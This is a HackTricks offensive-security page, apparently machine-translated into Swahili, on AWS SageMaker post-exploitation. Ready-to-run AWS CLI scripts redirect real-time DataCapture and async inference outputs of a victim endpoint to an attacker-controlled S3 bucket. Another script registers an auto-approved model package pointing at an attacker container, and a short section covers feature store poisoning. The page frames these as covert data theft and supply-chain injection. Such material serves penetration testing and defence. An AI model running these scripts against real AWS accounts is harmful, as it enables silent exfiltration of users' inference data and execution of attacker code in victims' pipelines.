# AWS - SageMaker Post-Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## Kuchota data za SageMaker endpoint kupitia UpdateEndpoint DataCaptureConfig

Tumia vibaya usimamizi wa endpoint wa SageMaker ili kuwezesha kunasa kikamilifu request/response kwenda S3 bucket inayodhibitiwa na mshambuliaji bila kugusa model au container. Inatumia rolling update yenye zero/low‑downtime na inahitaji tu ruhusa za usimamizi wa endpoint.

### Requirements
- IAM: `sagemaker:DescribeEndpoint`, `sagemaker:DescribeEndpointConfig`, `sagemaker:CreateEndpointConfig`, `sagemaker:UpdateEndpoint`
- S3: `s3:CreateBucket` (au tumia bucket iliyopo katika akaunti ileile)
- Optional (if using SSE‑KMS): `kms:Encrypt` on the chosen CMK
- Target: An existing InService real‑time endpoint in the same account/region

### Steps
1) Tambua endpoint ya InService na ukusanye production variants za sasa
```bash
REGION=${REGION:-us-east-1}
EP=$(aws sagemaker list-endpoints --region $REGION --query "Endpoints[?EndpointStatus=='InService']|[0].EndpointName" --output text)
echo "Endpoint=$EP"
CFG=$(aws sagemaker describe-endpoint --region $REGION --endpoint-name "$EP" --query EndpointConfigName --output text)
echo "EndpointConfig=$CFG"
aws sagemaker describe-endpoint-config --region $REGION --endpoint-config-name "$CFG" --query ProductionVariants > /tmp/pv.json
```
2) Andaa S3 destination ya attacker kwa ajili ya captures
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-capture-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION
```
3) Tengeneza EndpointConfig mpya inayohifadhi variants zile zile lakini inawasha DataCapture kwenda attacker bucket

Kumbuka: Tumia aina za maudhui zilizoainishwa wazi zinazokidhi uthibitishaji wa CLI.
```bash
NEWCFG=${CFG}-dc
cat > /tmp/dc.json << JSON
{
"EnableCapture": true,
"InitialSamplingPercentage": 100,
"DestinationS3Uri": "s3://$BUCKET/capture",
"CaptureOptions": [
{"CaptureMode": "Input"},
{"CaptureMode": "Output"}
],
"CaptureContentTypeHeader": {
"JsonContentTypes": ["application/json"],
"CsvContentTypes": ["text/csv"]
}
}
JSON
aws sagemaker create-endpoint-config \
--region $REGION \
--endpoint-config-name "$NEWCFG" \
--production-variants file:///tmp/pv.json \
--data-capture-config file:///tmp/dc.json
```
4) Weka usanidi mpya kwa rolling update (na downtime ndogo au bila)
```bash
aws sagemaker update-endpoint --region $REGION --endpoint-name "$EP" --endpoint-config-name "$NEWCFG"
aws sagemaker wait endpoint-in-service --region $REGION --endpoint-name "$EP"
```
5) Tengeneza angalau mwito mmoja wa inferensi (hiari ikiwa kuna trafiki ya moja kwa moja)
```bash
echo '{"inputs":[1,2,3]}' > /tmp/payload.json
aws sagemaker-runtime invoke-endpoint --region $REGION --endpoint-name "$EP" \
--content-type application/json --accept application/json \
--body fileb:///tmp/payload.json /tmp/out.bin || true
```
6) Thibitisha captures kwenye S3 ya attacker
```bash
aws s3 ls s3://$BUCKET/capture/ --recursive --human-readable --summarize
```
### Athari
- Full exfiltration ya payloads za maombi na majibu za real‑time inference (na metadata) kutoka endpoint iliyolengwa kwenda S3 bucket inayodhibitiwa na mshambuliaji.
- Hakuna mabadiliko kwenye model/container image na mabadiliko ni kwa kiwango cha endpoint peke, ikiruhusu njia ya siri ya wizi wa data kwa usumbufu mdogo wa uendeshaji.


## SageMaker async inference output hijack via UpdateEndpoint AsyncInferenceConfig

Tumia vibaya usimamizi wa endpoint ili kuelekeza matokeo ya asynchronous inference kwenye S3 bucket inayodhibitiwa na mshambuliaji kwa kukopa EndpointConfig ya sasa na kuweka AsyncInferenceConfig.OutputConfig S3OutputPath/S3FailurePath. Hii exfiltrates matabiri za model (na input yoyote iliyobadilishwa iliyojumuishwa na container) bila kubadilisha model/container.

### Mahitaji
- IAM: `sagemaker:DescribeEndpoint`, `sagemaker:DescribeEndpointConfig`, `sagemaker:CreateEndpointConfig`, `sagemaker:UpdateEndpoint`
- S3: Uwezo wa kuandika kwenye S3 bucket ya mshambuliaji (kupitia model execution role au bucket policy yenye kibali)
- Lengo: Endpoint ya InService ambapo asynchronous invocations zinatumika (au zitatumika)

### Hatua
1) Kusanya ProductionVariants za sasa kutoka kwenye endpoint lengwa
```bash
REGION=${REGION:-us-east-1}
EP=<target-endpoint-name>
CUR_CFG=$(aws sagemaker describe-endpoint --region $REGION --endpoint-name "$EP" --query EndpointConfigName --output text)
aws sagemaker describe-endpoint-config --region $REGION --endpoint-config-name "$CUR_CFG" --query ProductionVariants > /tmp/pv.json
```
2) Unda attacker bucket (hakikisha model execution role inaweza PutObject kwenye bucket hiyo)
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-async-exfil-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION || true
```
3) Nakili EndpointConfig na hijack AsyncInference outputs kwa attacker bucket
```bash
NEWCFG=${CUR_CFG}-async-exfil
cat > /tmp/async_cfg.json << JSON
{"OutputConfig": {"S3OutputPath": "s3://$BUCKET/async-out/", "S3FailurePath": "s3://$BUCKET/async-fail/"}}
JSON
aws sagemaker create-endpoint-config --region $REGION   --endpoint-config-name "$NEWCFG"   --production-variants file:///tmp/pv.json   --async-inference-config file:///tmp/async_cfg.json
aws sagemaker update-endpoint --region $REGION --endpoint-name "$EP" --endpoint-config-name "$NEWCFG"
aws sagemaker wait endpoint-in-service --region $REGION --endpoint-name "$EP"
```
4) Anzisha async invocation na thibitisha objects zinafika kwenye attacker S3
```bash
aws s3 cp /etc/hosts s3://$BUCKET/inp.bin
aws sagemaker-runtime invoke-endpoint-async --region $REGION --endpoint-name "$EP" --input-location s3://$BUCKET/inp.bin >/tmp/async.json || true
sleep 30
aws s3 ls s3://$BUCKET/async-out/ --recursive || true
aws s3 ls s3://$BUCKET/async-fail/ --recursive || true
```
### Athari
- Huelekeza matokeo ya asynchronous inference (na mwili wa makosa) hadi S3 inayoendeshwa na mshambuliaji, ikiruhusu exfiltration kwa siri ya predictions na kwa kiasi kinachowezekana viingilio vyenye uelekezaji kabla/baada ya kuwekwa (pre/post-processed) vinavyozalishwa na container, bila kubadilisha model code au image na kwa downtime ndogo/haipo.

## SageMaker Model Registry supply-chain injection via CreateModelPackage(Approved)

Ikiwa mshambuliaji anaweza kufanya CreateModelPackage kwenye target SageMaker Model Package Group, wanaweza kusajili toleo jipya la model ambalo linaelekeza kwa attacker-controlled container image na mara moja kulifanya Approved. Mifumo mingi ya CI/CD hu-auto-deploy toleo Approved la model kwa endpoints au training jobs, na kusababisha execution ya attacker code chini ya execution roles za service. Exposure ya cross-account inaweza kuongezeka kwa sera ya rasilimali ya ModelPackageGroup yenye ruhusa nyingi.

### Mahitaji
- IAM (kiasi cha chini kinachohitajika kuchafua kikundi kilicho tayari kuwepo): `sagemaker:CreateModelPackage` kwenye target ModelPackageGroup
- Hiari (kuunda kikundi ikiwa hakipo): `sagemaker:CreateModelPackageGroup`
- S3: Ufikiaji wa kusoma kwa referenced ModelDataUrl (au kuwa mwenyeji wa attacker-controlled artifacts)
- Target: Model Package Group ambayo automation ya downstream inatazama kwa toleo ambazo zimetengenezwa Approved

### Hatua
1) Weka region na unda/pata Model Package Group lengwa
```bash
REGION=${REGION:-us-east-1}
MPG=victim-group-$(date +%s)
aws sagemaker create-model-package-group --region $REGION --model-package-group-name $MPG --model-package-group-description "test group"
```
2) Tayarisha data ya modeli bandia katika S3
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-mpkg-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION
head -c 1024 </dev/urandom > /tmp/model.tar.gz
aws s3 cp /tmp/model.tar.gz s3://$BUCKET/model/model.tar.gz --region $REGION
```
3) Sajili toleo la Approved model package lenye madhara (hapa lisilo hatari) linalorejelea image ya umma ya AWS DLC
```bash
IMG="683313688378.dkr.ecr.$REGION.amazonaws.com/sagemaker-scikit-learn:1.2-1-cpu-py3"
cat > /tmp/inf.json << JSON
{
"Containers": [
{
"Image": "$IMG",
"ModelDataUrl": "s3://$BUCKET/model/model.tar.gz"
}
],
"SupportedContentTypes": ["text/csv"],
"SupportedResponseMIMETypes": ["text/csv"]
}
JSON
aws sagemaker create-model-package --region $REGION   --model-package-group-name $MPG   --model-approval-status Approved   --inference-specification file:///tmp/inf.json
```
4) Thibitisha toleo jipya iliyoidhinishwa lipo
```bash
aws sagemaker list-model-packages --region $REGION --model-package-group-name $MPG --output table
```
### Athari
- Choma Model Registry kwa toleo la Approved linalorejelea code inayodhibitiwa na mshambuliaji. Pipelines zinazojideploy moja kwa moja Approved models zinaweza kuvuta na kuendesha attacker image, na kusababisha utekelezaji wa code chini ya endpoint/training roles.
- Kwa sera ya rasilimali ya ModelPackageGroup yenye kuruhusu (PutModelPackageGroupPolicy), matumizi haya yanaweza kuchochewa cross-account.

## Feature store poisoning

Matumizi mabaya ya `sagemaker:PutRecord` kwenye Feature Group yenye OnlineStore imewezeshwa kuandika upya (overwrite) thamani za features zinazoishi zinazotumika na online inference. Ikichanganywa na `sagemaker:GetRecord`, mshambuliaji anaweza kusoma features nyeti. Hii haihitaji upatikanaji wa models au endpoints.

{{#ref}}
feature-store-poisoning.md
{{/ref}}
{{#include ../../../../banners/hacktricks-training.md}}
